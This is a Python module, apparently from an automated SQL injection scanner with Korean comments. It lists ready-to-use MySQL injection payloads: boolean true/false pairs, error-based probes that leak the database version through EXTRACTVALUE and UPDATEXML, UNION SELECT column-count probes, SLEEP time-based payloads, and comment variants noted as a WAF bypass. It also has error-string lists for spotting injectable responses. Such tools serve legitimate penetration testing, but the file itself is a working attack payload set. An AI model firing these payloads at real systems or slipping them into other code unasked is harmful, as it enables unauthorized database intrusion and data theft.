from typing import TypedDict


class BooleanPayloadPair(TypedDict):
    family: str
    true_payload: str
    false_payload: str


BOOLEAN_STRING_AND: BooleanPayloadPair = {
    "family": "and_string",
    "true_payload":  "{base}' AND '1'='1'-- -",
    "false_payload": "{base}' AND '1'='2'-- -",
}

# WHERE id = {base} 형태 (숫자 컨텍스트)
BOOLEAN_NUMERIC_AND: BooleanPayloadPair = {
    "family": "and_numeric",
    "true_payload":  "{base} AND 1=1-- -",
    "false_payload": "{base} AND 1=2-- -",
}

# OR 계열 — AND로 차이가 안 보일 때 2차로 시도 (조건을 무력화/제거하는 방식)
BOOLEAN_STRING_OR: BooleanPayloadPair = {
    "family": "or_string",
    "true_payload":  "{base}' OR '1'='1'-- -",
    "false_payload": "{base}' OR '1'='2'-- -",
}

BOOLEAN_NUMERIC_OR: BooleanPayloadPair = {
    "family": "or_numeric",
    "true_payload":  "{base} OR 1=1-- -",
    "false_payload": "{base} OR 1=2-- -",
}

# # 주석 계열 — MySQL에서 -- - 대신 # 사용 (WAF 우회 / 환경 차이 대응)
BOOLEAN_STRING_AND_HASH: BooleanPayloadPair = {
    "family": "and_string_hash",
    "true_payload":  "{base}' AND '1'='1'#",
    "false_payload": "{base}' AND '1'='2'#",
}

BOOLEAN_NUMERIC_AND_HASH: BooleanPayloadPair = {
    "family": "and_numeric_hash",
    "true_payload":  "{base} AND 1=1#",
    "false_payload": "{base} AND 1=2#",
}

BOOLEAN_STRING_OR_HASH: BooleanPayloadPair = {
    "family": "or_string_hash",
    "true_payload":  "{base}' OR '1'='1'#",
    "false_payload": "{base}' OR '1'='2'#",
}

BOOLEAN_NUMERIC_OR_HASH: BooleanPayloadPair = {
    "family": "or_numeric_hash",
    "true_payload":  "{base} OR 1=1#",
    "false_payload": "{base} OR 1=2#",
}

# ORDER BY 컨텍스트 — sort/order 파라미터용 CASE WHEN 방식
BOOLEAN_ORDERBY: BooleanPayloadPair = {
    "family": "orderby_case",
    "true_payload":  "CASE WHEN (1=1) THEN {base} ELSE 2 END",
    "false_payload": "CASE WHEN (1=2) THEN {base} ELSE 2 END",
}

ALL_BOOLEAN_PAIRS: list[BooleanPayloadPair] = [
    BOOLEAN_STRING_AND,
    BOOLEAN_NUMERIC_AND,
    BOOLEAN_STRING_OR,
    BOOLEAN_NUMERIC_OR,
    BOOLEAN_STRING_AND_HASH,
    BOOLEAN_NUMERIC_AND_HASH,
    BOOLEAN_STRING_OR_HASH,
    BOOLEAN_NUMERIC_OR_HASH,
    BOOLEAN_ORDERBY,
]

# 닫는 따옴표 없이 일부러 문법을 깨서 DB 에러를 유도하는 페이로드
ERROR_BASED_PAYLOADS: list[str] = [
    "{base}'",
    '{base}"',
    "{base}' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
    "{base}' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
    "{base}' ORDER BY 100-- -",
    "{base} ORDER BY 100-- -",
]

# UNION SELECT로 컬럼 수 불일치 에러를 유도 (별도 카테고리로 분류)
UNION_PAYLOADS: list[str] = [
    "{base}' UNION ALL SELECT NULL-- -",
    "{base}' UNION ALL SELECT NULL,NULL-- -",
    "{base}' UNION ALL SELECT NULL,NULL,NULL-- -",
    "{base}' UNION ALL SELECT NULL,NULL,NULL,NULL-- -",
    "{base} UNION ALL SELECT NULL-- -",
    "{base} UNION ALL SELECT NULL,NULL-- -",
    "{base} UNION ALL SELECT NULL,NULL,NULL-- -",
    "{base}') UNION ALL SELECT NULL-- -",
    "{base}') UNION ALL SELECT NULL,NULL-- -",
]

UNION_ERROR_KEYWORDS: tuple[str, ...] = (
    "the used select statements have a different number of columns",
    "column count doesn't match",
)

# SLEEP()으로 응답 지연을 유도하는 페이로드
TIME_BASED_PAYLOADS: list[str] = [
    "{base}' AND SLEEP(5)-- -",
    "{base} AND SLEEP(5)-- -",
]

DB_ERROR_KEYWORDS: tuple[str, ...] = (
    "you have an error in your sql syntax",
    "warning: mysql",
    "unknown column",
    "mysql_fetch",
    "mysqli_",
    "sql syntax",
    "mariadb server version",
    "supplied argument is not a valid mysql",
    "division by zero",
    "duplicate entry",
    "xpath syntax error",
    "the used select statements have a different number of columns",
    "column count doesn't match",
)


def render(payload: str, base_value: str) -> str:
    return payload.replace("{base}", base_value)
